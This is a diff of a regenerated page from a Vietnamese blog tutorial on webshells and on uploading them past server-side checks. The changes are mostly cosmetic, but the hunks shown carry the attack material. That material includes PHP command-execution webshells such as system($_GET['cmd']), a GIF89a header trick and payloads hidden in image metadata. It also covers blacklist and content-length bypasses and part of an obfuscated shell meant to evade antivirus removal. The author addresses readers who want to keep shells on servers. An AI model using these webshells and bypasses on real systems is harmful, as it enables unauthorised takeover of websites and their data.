@@ -5,7 +5,7 @@
     <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="generator" content="Hugo 0.65.2 with theme Tranquilpeak 0.4.7-BETA">
+<meta name="generator" content="Hugo 0.79.1 with theme Tranquilpeak 0.4.8-BETA">
 <meta name="author" content="Nguyễn Mạnh">
 <meta name="keywords" content=", development, cyber security">
 <meta name="description" content="WebShell là 1 dạng mã độc, cửa hậu có nhiều chức năng để hỗ trợ các hacker chiếm quyền quản lý các hệ thống website.WebShell thường được viết bằng nhiều loại ngôn ngữ và thường thì chính là ngôn ngữ mà website đó đang sử dụng. Chức năng cơ bản là tải tệp tin lên máy chủ, kết nối đến cơ sở dữ liệu, vượt qua các cơ chế bảo mật, cấu hình, tấn công bruteforce, Get Root, Local Attack… chỉ cần hacker có thể tải được các tệp tin webshell này lên hệ thống của website thì xem như hacker đã có toàn quyền kiểm soát website đó, cho dù không biết tài khoản và mật khẩu của máy chủ này là gì.">
@@ -330,11 +330,11 @@
 <p><img src="https://manhnv.com/images/posts/webshell-la-gi-lam-the-nao-de-upload-su-dung-mot-webshell/content_type1.png?raw=true" alt="content-type" title="content-type"></p>
 <p><strong>Fool Server side check using GIF89a; header</strong></p>
 <p>Đôi khi kiểm tra chữ ký nội dung phía máy chủ có thể bị đánh lừa bằng cách sử dụng <code>GIF89a;</code> trong header tệp shell của bạn. Và đây là một ví dụ:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">GIF89a;
-<span style="color:#75715e">&lt;?</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">GIF89a</span>;
+<span style="color:#f92672">&lt;?</span>
 <span style="color:#a6e22e">system</span>($_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>]);<span style="color:#75715e">//or you can insert your complete shell code
-</span><span style="color:#75715e"></span><span style="color:#75715e">?&gt;</span>
-</code></pre></div><p><strong>Inject your payload in Image Metadata/Comments</strong></p>
+</span><span style="color:#75715e"></span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p><strong>Inject your payload in Image Metadata/Comments</strong></p>
 <p>Có rất nhiều cách hack mà chúng ta có thể thực hiện với tệp hình ảnh, một trong số chúng là đứa payload và <code>metadata header</code> bằng <code>exiftools</code> hoặc bạn có thể sử dụng một công cụ có tên <code>edjpgcom.exe</code>. Sử dụng dòng lệnh <code>edjpgcom.exe yourimagefilename.jpg</code> để thêm comments cho hình ảnh của bạn.</p>
 <h3 id="3-bypassing-the-extension-black-listing">3. Bypassing the Extension Black Listing</h3>
 <p>Đôi khi các nhà phát triể sử dụng phương pháp liệt kê danh sách đen chống lại việc tải shell lên, vấn đề với việc duyệt danh sách đen luôn giống nhau, và nhiều khi bạn có thể bỏ sót mà quên chặn đi một cái gì đó thì kẻ tấn công có thể bypass ngay. Giả sử các nhà phát triển đang lọc các tệp php không được tải lên server. Tôi sẽ hướng dẫn cho các bạn một số các để bypass nó.</p>
@@ -377,7 +377,7 @@ shell.PhtMl
 <h3 id="5-bypassing-the-content-length-and-malicious-script-checks">5. Bypassing the Content Length and Malicious script checks</h3>
 <p><strong>Content Length Bypass</strong></p>
 <p>Đôi khi chúng ta sẽ gặp một số ứng dụng kiểm tra độ dài của nội dung tệp tải lên. Hãy nhớ ràng có một số cách rất dễ dàng để vượt qua cách kiểm tra như vậy. Nếu máy chủ đang kiểm tra đầu vào tệp rất nhỏ thì đây là mã shell nhỏ bạn có thể sử dụng:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?</span><span style="color:#a6e22e">system</span>($_GET[<span style="color:#ae81ff">0</span>]);
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">system</span>($_GET[<span style="color:#ae81ff">0</span>]);
 </code></pre></div><p>Bây giờ nếu kiểm tra kích thước tệp lớn hơn, chúng ta có thể làm cho tệp có nội dung lớn hơn bằng cách chèn rất nhiều rác vào tệp của mình:</p>
 <p><strong>Malicious script checks Bypass</strong></p>
 <p>Nhiều lần tôi có tải thành công một shell lên một máy chủ nhưng khi tôi quay lại cố truy cập nó, thì phát hiện shell của mình đã bị xóa. Thường thì một số AV (anti virus) hoặc các tệp lệnh độc hại và xóa. bây giờ chúng ta có thể đối phó với nó một cách dễ dàng nhưng tôi đang viết bài này cho những người không biết xử lý vấn đề như thế này. Vì vậy, ở đây chúng ta cần một số kiến thức cơ bản về mã hóa hoặc là biết cách copy/patse. ở đây tôi sử dụng một số tệp lệnh shell hoặc động trong các tình huống như vậy:</p>
@@ -500,7 +500,7 @@ $_<span style="color:#f92672">=(</span>$_^<span style="color:#e6db74">&#34;&lt;&
         </article>
         <footer id="footer" class="main-content-wrap">
   <span class="copyrights">
-    &copy; 2020 <a href="https://facebook.com/nguyenmanh1997">Nguyễn Mạnh</a><a href="//www.dmca.com/Protection/Status.aspx?ID=26de1c55-21c3-4e09-9e8b-f7507ee02f5e" title="DMCA.com Protection Status" class="dmca-badge"> <img src ="https://images.dmca.com/Badges/dmca_protected_sml_120m.png?ID=26de1c55-21c3-4e09-9e8b-f7507ee02f5e"  alt="DMCA.com Protection Status" /></a>  <script src="https://images.dmca.com/Badges/DMCABadgeHelper.min.js"> </script>. All Rights Reserved
+    &copy; 2021 <a href="https://facebook.com/nguyenmanh1997">Nguyễn Mạnh</a><a href="//www.dmca.com/Protection/Status.aspx?ID=26de1c55-21c3-4e09-9e8b-f7507ee02f5e" title="DMCA.com Protection Status" class="dmca-badge"> <img src ="https://images.dmca.com/Badges/dmca_protected_sml_120m.png?ID=26de1c55-21c3-4e09-9e8b-f7507ee02f5e"  alt="DMCA.com Protection Status" /></a>  <script src="https://images.dmca.com/Badges/DMCABadgeHelper.min.js"> </script>. All Rights Reserved
   </span>
 </footer>
 
